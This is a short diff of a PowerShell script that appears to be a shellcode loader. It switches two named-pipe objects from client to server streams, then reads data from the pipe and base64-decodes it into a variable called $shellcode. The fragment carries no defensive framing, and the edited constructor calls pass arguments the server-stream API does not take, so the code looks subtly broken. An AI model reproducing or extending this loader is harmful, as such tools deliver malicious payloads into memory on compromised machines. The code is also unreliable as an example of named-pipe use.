@@ -46,7 +46,7 @@ $startMain = [Main]
 
 #PIPING
 $pipeName = "Pipe1"
-$pipe = New-Object System.IO.Pipes.NamedPipeClientStream(".", $pipeName, [System.IO.Pipes.PipeDirection]::In)
+$pipe = New-Object System.IO.Pipes.NamedPipeServerStream(".", $pipeName, [System.IO.Pipes.PipeDirection]::In)
 
 #$pipe.Connect()
 $pipe.WaitForConnection()
@@ -60,7 +60,7 @@ $pipe.Close()
 
 #SECOND CON
 
-$pipe = New-Object System.IO.Pipes.NamedPipeClientStream(".", $pipeName, [System.IO.Pipes.PipeDirection]::In)
+$pipe = New-Object System.IO.Pipes.NamedPipeServerStream(".", $pipeName, [System.IO.Pipes.PipeDirection]::In)
 
 #$pipe.Connect()
 $pipe.WaitForConnection()
@@ -70,7 +70,6 @@ $bytesRead = $pipe.Read($bytes, 0, $bytes.Length)
 
 $enc = [System.Text.Encoding]::UTF8.GetString($bytes, 0, $bytesRead)
 [Byte[]]$shellcode = [System.Convert]::FromBase64String($enc)
-
 
 
 
